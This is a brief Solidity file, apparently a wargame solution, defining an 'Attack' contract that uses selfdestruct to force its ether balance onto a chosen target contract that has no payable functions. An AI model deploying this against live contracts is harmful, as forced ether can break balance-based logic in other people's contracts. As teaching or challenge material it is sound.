// src/Mycontract.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract Attack {
    address public force;

    constructor(address _force) payable {
        force = _force;
    }
    receive() external payable {}
    
    function attack() public {
        selfdestruct(payable(force));
    }
}
